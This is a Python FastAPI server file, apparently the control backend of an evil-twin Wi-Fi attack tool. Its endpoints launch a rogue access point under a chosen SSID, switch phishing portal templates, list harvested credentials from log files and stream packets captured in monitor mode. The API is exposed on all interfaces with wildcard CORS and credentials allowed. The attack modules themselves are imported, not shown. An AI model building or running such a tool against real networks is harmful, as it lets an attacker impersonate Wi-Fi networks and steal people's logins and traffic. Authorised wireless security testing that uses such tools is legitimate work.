from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import subprocess
import os
from pathlib import Path

from modules.evil_twin import EvilTwinAP
from modules.phishing_portal_loader import PortalTemplateManager
from modules.packet_capture import PacketCapture, enable_monitor_mode, disable_monitor_mode

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

ap_instance = EvilTwinAP()
template_manager = PortalTemplateManager()
pcap = PacketCapture()

LOGS_DIR = Path("./phishing_portal/logs")

class SSIDPayload(BaseModel):
    ssid: str

class TemplatePayload(BaseModel):
    name: str

@app.get("/api/templates")
def get_templates():
    return template_manager.list_templates()

@app.post("/api/activate_template")
def activate_template(payload: TemplatePayload):
    try:
        template_manager.activate_template(payload.name)
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/start_ap")
def start_ap(payload: SSIDPayload):
    ap_instance.ssid = payload.ssid
    ap_instance.start()
    return {"status": "started", "ssid": payload.ssid}

@app.post("/api/stop_ap")
def stop_ap():
    ap_instance.stop()
    return {"status": "stopped"}

@app.get("/api/creds")
def get_creds():
    entries = []
    if LOGS_DIR.exists():
        for log_file in sorted(LOGS_DIR.glob("creds_*.txt"), reverse=True):
            with open(log_file) as f:
                lines = [line.strip() for line in f if line.strip()]
                entries.append({"file": log_file.name, "entries": lines})
    return JSONResponse(content=entries)

@app.post("/api/packet_capture/start")
def start_packet_capture():
    enable_monitor_mode()
    pcap.start()
    return {"status": "packet capture started"}

@app.post("/api/packet_capture/stop")
def stop_packet_capture():
    pcap.stop()
    disable_monitor_mode()
    return {"status": "packet capture stopped"}

@app.get("/api/packet_capture/live")
def get_live_packets():
    packets = pcap.get_live_packets()
    return JSONResponse(content=packets)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("api_server:app", host="0.0.0.0", port=8000, reload=True)
